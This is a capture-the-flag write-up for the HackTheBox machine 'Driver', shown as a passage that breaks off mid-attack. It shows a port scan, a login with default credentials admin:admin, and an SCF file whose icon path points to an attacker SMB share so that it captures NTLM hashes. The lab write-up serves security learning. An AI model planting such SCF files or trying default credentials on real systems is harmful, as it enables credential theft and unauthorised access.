# Driver
> Write-up author: jon-brandy
## DESCRIPTION:
- NONE
## HINT:
- NONE
## STEPS:

> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC -Pn 10.10.11.106 -T4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-11 00:40 PDT
Nmap scan report for 10.10.11.106
Host is up (0.020s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-11T14:42:06
|_  start_date: 2023-08-11T14:39:43
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.39 seconds
```

Using nmap, we identified that there are 4 ports open: 80, 135 (MSRPC service), 445 (SMB service), and 5985. Port 5985 (WinRM service) should be of interest here. Anyway, since it runs a webapp, I succeeded in logging in using `admin:admin`.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7b3e6987-30f9-4f12-8881-64b73201c8c7)


It seems the vulnerability is in the file upload feature because it does not check the uploaded file; the file itself shall be reviewed manually later by the testing team.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a69f817c-0ea2-4196-996c-41501be82cec)


Remembering that the OS used is Windows,  we can upload a Shell Command File (SCF) that can make a connection back to our local machine using SMB (remembering the file is uploaded to a SMB share). With this, we can grab the NTLM Hash.

#### NOTES:

```
NTLM (NT LAN Manager) hash is a cryptographic hash function used in Windows OS for authentication purposes.
It's commonly used as a password hashing mechanism in Windows env.
NTLM hash is designed to hash passwords and other data for security,
 but it's considered relatively weak compared to more modern hashing algorithms like bcrypt or Argon2.
```

Since there is SMB Share, i used this template `.scf` file from this --> https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/.

> SCF FILE

```
[Shell]
Command=2
IconFile=\\10.10.14.4\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

To capture the NTLM hash, we can either using **responder** or **impacket-smbserver**. 
